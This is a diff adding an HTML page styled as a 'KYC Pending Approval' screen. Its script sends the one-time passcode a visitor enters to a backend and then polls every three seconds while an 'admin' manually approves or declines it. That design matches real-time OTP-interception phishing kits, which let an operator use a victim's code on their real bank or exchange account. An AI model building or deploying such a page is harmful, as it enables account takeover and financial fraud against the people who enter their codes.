@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>KYC OTP Verification</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;700&display=swap" rel="stylesheet">
+<style>
+body {
+  background: #0d0d0d;
+  color: white;
+  font-family: Poppins, sans-serif;
+  text-align: center;
+  padding-top: 80px;
+}
+.box {
+  width: 500px;
+  margin: auto;
+  background: #151515;
+  padding: 40px;
+  border-radius: 20px;
+  box-shadow: 0 0 25px rgba(255,215,0,0.3);
+}
+h1 { color: gold; margin-bottom: 20px; }
+input {
+  width: 100%;
+  padding: 12px;
+  margin-top: 10px;
+  border: none;
+  border-radius: 8px;
+}
+button {
+  margin-top: 20px;
+  padding: 14px;
+  width: 100%;
+  background: gold;
+  border: none;
+  border-radius: 10px;
+  font-weight: bold;
+  cursor: pointer;
+}
+button:hover { background: #e6c200; }
+#message { margin-top: 15px; font-size: 14px; color: #ccc; }
+</style>
+</head>
+<body>
+
+<div class="box">
+<h1>🟡 KYC Pending Approval</h1>
+<p>
+Your KYC is pending. Please enter the OTP you received via your phone/email.<br>
+Admin will validate it before you can proceed to final verification.
+</p>
+
+<label>Enter OTP</label>
+<input type="text" id="userOtp" placeholder="Enter OTP">
+<button onclick="submitOTP()">Submit OTP</button>
+
+<div id="message"></div>
+</div>
+
+<script>
+// Function to submit OTP to backend
+function submitOTP() {
+  const otp = document.getElementById("userOtp").value.trim();
+  if(!otp) {
+    document.getElementById("message").innerText = "❌ Please enter the OTP.";
+    return;
+  }
+
+  document.getElementById("message").innerText = "⏳ Sending OTP for admin validation...";
+
+  fetch("/api/kyc/validate-otp", {
+    method: "POST",
+    headers: {"Content-Type": "application/json"},
+    body: JSON.stringify({ otp })
+  })
+  .then(res => res.json())
+  .then(data => {
+    if(data.status === "pending") {
+      document.getElementById("message").innerText = "⏳ OTP received. Waiting for admin approval...";
+      // Poll admin response every 3 seconds
+      waitForAdminResponse(data.otpId);
+    } else {
+      document.getElementById("message").innerText = "❌ Invalid OTP submitted.";
+    }
+  })
+  .catch(err => {
+    console.error(err);
+    document.getElementById("message").innerText = "⚠️ Error sending OTP. Try again.";
+  });
+}
+
+// Polling function to check admin approval
+function waitForAdminResponse(otpId) {
+  const interval = setInterval(() => {
+    fetch(`/api/kyc/admin-response/${otpId}`)
+      .then(res => res.json())
+      .then(data => {
+        if(data.status === "approved") {
+          clearInterval(interval);
+          document.getElementById("message").innerText = "✅ OTP approved by admin! Redirecting...";
+          setTimeout(() => window.location.href="/kyc-final.html", 2000);
+        } else if(data.status === "declined") {
+          clearInterval(interval);
+          document.getElementById("message").innerText = "❌ OTP declined by admin. Contact support.";
+        }
+      });
+  }, 3000); // check every 3 seconds
+}
+</script>
+
+</body>
+</html>
